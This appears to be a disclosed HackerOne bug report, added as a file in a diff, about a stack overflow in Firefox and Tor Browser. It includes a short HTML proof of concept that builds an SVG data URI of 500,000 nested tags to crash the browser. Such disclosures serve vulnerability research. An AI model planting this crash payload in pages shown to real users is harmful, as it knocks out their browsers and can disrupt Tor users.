@@ -1,0 +1,34 @@
+ReportLink:https://hackerone.com/reports/264481
+WeaknessName:Stack Overflow
+Reporter:https://hackerone.com/geeknik
+ReportedTo:Tor(torproject)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:02.10.2017 7:40:29
+
+Summary:
+
+I reported this bug to Mozilla approximately [9 months ago](https://bugzilla.mozilla.org/show_bug.cgi?id=1322307) and all versions of Firefox back to at least ESR45 and including current Nightly 57 builds are still vulnerable to this unpatched flaw. I've tested on Fedora 26, Debian 8, Windows 8 and Windows 10. Mozilla declined to award a bounty. 
+
+Code:
+```
+<html>
+<head></head>
+<body>
+<script>
+function done() {
+}
+
+var x = '';
+for (i=0; i<500000; ++i)
+  x += '<a>';
+var uri = 'data:image/svg+xml,' + x;
+var i = new Image();
+i.src = uri;
+</script>
+</body>
+</html>
+```
+
+The caveat to this is that if scripts are disabled on the page where this code is located, the Tor browser won't crash. [This link](https://bugzilla.mozilla.org/attachment.cgi?id=8817075) will probably crash your Firefox. A WinDBG stack trace is located [here](https://bugzilla.mozilla.org/attachment.cgi?id=8817117).
